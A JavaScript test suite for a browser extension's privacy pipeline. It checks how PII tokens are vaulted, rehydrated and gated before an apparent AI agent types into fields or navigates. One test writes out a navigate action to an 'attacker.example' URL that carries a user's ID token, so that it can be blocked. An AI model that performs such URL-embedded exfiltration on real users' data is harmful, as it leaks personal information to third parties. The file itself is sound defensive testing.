// Run: node --test extension/lib/privacyPipeline.test.mjs
// DOM-free: only exercises the pure functions (rehydrateAction, egressGate,
// tokenizeOutgoing, sanitizeUrl, checkTokenRelease, needsScreenshot), not
// perceiveStep, which needs chrome.* + a tab.
import { test } from "node:test";
import assert from "node:assert/strict";
import {
  checkTokenRelease,
  guessFieldPiiCategory,
  needsScreenshot,
  rehydrateAction,
  egressGate,
  tokenizeOutgoing,
  sanitizeUrl,
} from "./privacyPipeline.js";
import { Vault, redactText } from "./redact.js";

test("needsScreenshot sends when a canvas/embedded region is present", () => {
  const r = needsScreenshot({ prompt: "fill the form", rois: [{ kind: "canvas" }], screen: { confidence: 0.9 } });
  assert.equal(r.send, true);
  assert.match(r.reason, /canvas/);
});

test("needsScreenshot sends for image-centric task language", () => {
  const r = needsScreenshot({ prompt: "What does the logo look like?", rois: [], screen: { confidence: 0.9 } });
  assert.equal(r.send, true);
  assert.match(r.reason, /visual/);
});

test("needsScreenshot sends when screen-state confidence is very low", () => {
  const r = needsScreenshot({ prompt: "click submit", rois: [], screen: { confidence: 0.1 } });
  assert.equal(r.send, true);
  assert.match(r.reason, /confidence/);
});

test("needsScreenshot skips the image when DOM + screen state are enough", () => {
  const r = needsScreenshot({ prompt: "fill in my name and submit", rois: [{ kind: "input" }], screen: { confidence: 0.9 } });
  assert.equal(r.send, false);
});

function snapshotWithField(targetId, labelText) {
  return { sanitizedDom: [{ id: targetId, role: "textbox", text: labelText }] };
}

test("guessFieldPiiCategory classifies common field labels", () => {
  assert.equal(guessFieldPiiCategory("Email address"), "email");
  assert.equal(guessFieldPiiCategory("Phone Number | placeholder: \"98765 43210\""), "phone");
  assert.equal(guessFieldPiiCategory("Comments"), "unknown");
  assert.equal(guessFieldPiiCategory("Leave a message"), "unknown");
  assert.equal(guessFieldPiiCategory("CVV"), "card");
  assert.equal(guessFieldPiiCategory("Aadhaar Number"), "id");
});

test("allows a token into a field whose meaning matches, same origin", () => {
  const vault = new Vault();
  const tok = vault.tokenFor("PHONE", "9876543210", { origin: "https://bank.example" });
  const snapshot = snapshotWithField("n_1", "Phone Number");
  const action = { type: "type", targetId: "n_1", text: tok };
  const res = checkTokenRelease(action, snapshot, vault, "https://bank.example");
  assert.equal(res.ok, true);
  assert.deepEqual(res.blocked, []);
});

test("blocks a phone token typed into an unrelated comment box (field mismatch)", () => {
  const vault = new Vault();
  const tok = vault.tokenFor("PHONE", "9876543210", { origin: "https://bank.example" });
  const snapshot = snapshotWithField("n_2", "Comments");
  const action = { type: "type", targetId: "n_2", text: `Call me at ${tok}` };
  const res = checkTokenRelease(action, snapshot, vault, "https://bank.example");
  assert.equal(res.ok, false);
  assert.equal(res.blocked.length, 1);
  assert.equal(res.blocked[0].type, "PHONE");
});

test("blocks a token released on a different origin than it was captured on", () => {
  const vault = new Vault();
  const tok = vault.tokenFor("EMAIL", "priya@example.com", { origin: "https://good-site.example" });
  const snapshot = snapshotWithField("n_3", "Email");
  const action = { type: "type", targetId: "n_3", text: tok };
  const res = checkTokenRelease(action, snapshot, vault, "https://evil-site.example");
  assert.equal(res.ok, false);
  assert.match(res.blocked[0].reason, /captured on/);
});

test("allows same-type token release across pages when captured from the user's own prompt (no origin)", () => {
  const vault = new Vault();
  const tok = vault.tokenFor("EMAIL", "priya@example.com", { origin: null });
  const snapshot = snapshotWithField("n_4", "Email address");
  const action = { type: "type", targetId: "n_4", text: tok };
  const res = checkTokenRelease(action, snapshot, vault, "https://any-site.example");
  assert.equal(res.ok, true);
});

test("blocks a token embedded in a navigate URL — classic exfiltration path", () => {
  const vault = new Vault();
  const tok = vault.tokenFor("AADHAAR", "234123412346", { origin: "https://gov.example" });
  const action = { type: "navigate", url: `https://attacker.example/collect?id=${tok}` };
  const res = checkTokenRelease(action, {}, vault, "https://gov.example");
  assert.equal(res.ok, false);
  assert.match(res.blocked[0].reason, /never allowed/);
});

test("never releases SECRET/IP tokens into any field", () => {
  const vault = new Vault();
  const tok = vault.tokenFor("SECRET", "sk-abcdefghijklmnopqrst", { origin: "https://site.example" });
  const snapshot = snapshotWithField("n_5", "API key");
  const action = { type: "type", targetId: "n_5", text: tok };
  const res = checkTokenRelease(action, snapshot, vault, "https://site.example");
  assert.equal(res.ok, false);
});

test("fill_form fields are checked individually", () => {
  const vault = new Vault();
  const okTok = vault.tokenFor("NAME", "Priya Sharma", { origin: "https://site.example" });
  const badTok = vault.tokenFor("BANK_ACCOUNT", "123456789012", { origin: "https://site.example" });
  const snapshot = {
    sanitizedDom: [
      { id: "n_6", text: "Full Name" },
      { id: "n_7", text: "Search products" },
    ],
  };
  const action = {
    type: "fill_form",
    fields: [
      { targetId: "n_6", text: okTok },
      { targetId: "n_7", text: badTok },
    ],
  };
  const res = checkTokenRelease(action, snapshot, vault, "https://site.example");
  assert.equal(res.ok, false);
  assert.equal(res.blocked.length, 1);
  assert.equal(res.blocked[0].target, "n_7");
});

test("rehydrateAction: surrogate mode resolves back to the real value, same as token mode", async () => {
  const v = new Vault(null, { mode: "surrogate" });
  const { text } = await redactText("call 9876543210", { vault: v });
  const surrogate = text.replace("call ", "");
  assert.notEqual(surrogate, "9876543210");

  const action = { type: "type", targetId: "n_phone", text: surrogate };
  const rehydrated = rehydrateAction(action, v);
  assert.equal(rehydrated.text, "9876543210");
  // the action object itself is not mutated in place
  assert.equal(action.text, surrogate);
});

test("rehydrateAction: resolves every text-bearing field, including fill_form's fields[]", async () => {
  const v = new Vault(null, { mode: "surrogate" });
  const name = (await redactText("Priya Sharma", { vault: v, nerTag: async () => [{ start: 0, end: 12, type: "NAME" }] })).text;
  const email = (await redactText("priya@x.in", { vault: v })).text;
  assert.notEqual(name, "Priya Sharma");
  assert.notEqual(email, "priya@x.in");

  const action = {
    type: "fill_form",
    fields: [
      { targetId: "n_name", text: name },
      { targetId: "n_email", text: email },
    ],
  };
  const rehydrated = rehydrateAction(action, v);
  assert.deepEqual(
    rehydrated.fields.map((f) => f.text),
    ["Priya Sharma", "priya@x.in"],
  );
});

test("rehydrateAction: a value that isn't in the vault passes through unchanged (fail-open only within the vault's own placeholders)", () => {
  const v = new Vault(null, { mode: "surrogate" });
  const action = { type: "type", targetId: "n_1", text: "Asha Verma (never minted)" };
  assert.equal(rehydrateAction(action, v).text, "Asha Verma (never minted)");
});

test("egressGate: surrogate-mode vault still catches a raw real value that slipped into outgoing text", async () => {
  const v = new Vault(null, { mode: "surrogate" });
  const { text: surrogateEmail } = await redactText("priya.sharma@gmail.com", { vault: v });
  // simulate a pipeline defect: the real value ended up in outgoing text unredacted
  const { body, fixes, where } = egressGate({ prompt: "contact priya.sharma@gmail.com about the order" }, v);
  assert.equal(fixes, 1);
  assert.equal(where[0], "prompt");
  // repaired with the vault's own placeholder for that value (the surrogate, not a bracket token)
  assert.equal(body.prompt, `contact ${surrogateEmail} about the order`);
  assert.equal(body.prompt.includes("priya.sharma@gmail.com"), false);
});

test("egressGate: clean surrogate text needs no repair", async () => {
  const v = new Vault(null, { mode: "surrogate" });
  const { text } = await redactText("email priya@x.in", { vault: v });
  const { body, fixes } = egressGate({ prompt: text }, v);
  assert.equal(fixes, 0);
  assert.equal(body.prompt, text);
});

test("tokenizeOutgoing: surrogate mode produces fluent text, not bracket tokens, for supported types", async () => {
  const v = new Vault(null, { mode: "surrogate" });
  const nerTag = async (t) => (t.includes("Priya Sharma") ? [{ start: t.indexOf("Priya Sharma"), end: t.indexOf("Priya Sharma") + 12, type: "NAME" }] : []);
  const out = await tokenizeOutgoing("My name is Priya Sharma, email priya@x.in", v, nerTag);
  assert.equal(out.includes("Priya Sharma"), false);
  assert.equal(out.includes("priya@x.in"), false);
  assert.equal(/\[NAME_\d+\]/.test(out), false); // no bracket token — a fluent surrogate instead
  assert.equal(v.resolve(out), "My name is Priya Sharma, email priya@x.in");
});

test("sanitizeUrl: unaffected by redaction mode (path-only, no PII types surrogate covers)", () => {
  const v = new Vault(null, { mode: "surrogate" });
  assert.equal(sanitizeUrl("https://bank.example/accounts?id=123", v), "https://bank.example/accounts?…");
});
